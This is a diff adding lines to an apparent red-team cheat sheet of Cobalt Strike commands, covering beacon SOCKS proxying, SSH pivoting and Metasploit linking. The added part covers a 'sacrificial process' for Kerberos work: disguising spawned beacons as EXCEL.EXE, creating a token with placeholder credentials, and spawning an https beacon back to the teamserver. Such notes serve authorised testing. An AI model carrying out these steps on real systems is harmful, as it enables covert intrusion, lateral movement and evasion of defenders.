@@ -212,6 +212,11 @@ Cobalt
   Proxychains: socks 9050 (beacon); edit /etc/proxychains.conf -> socks4 teamserverIP 9050
     * proxy firefox: proxy settings -> socks host: teamserver IP port 9050
   SSH-Key: shh-key 10.10.5.5:22 root /path/to/file.key
+  Cobalt Sacrificial Process
+      Good for working with kerberos tickets not to wipe out the current users tickets
+      spawnto x64 C:\Program Files\Microsoft Office\Office15\EXCEL.EXE
+      make_token domain\fakeuser Password123!
+      spawn x64 https
   
   Connect MetaSploit to Cobalt Listener
     msf: set lhost cobalt host
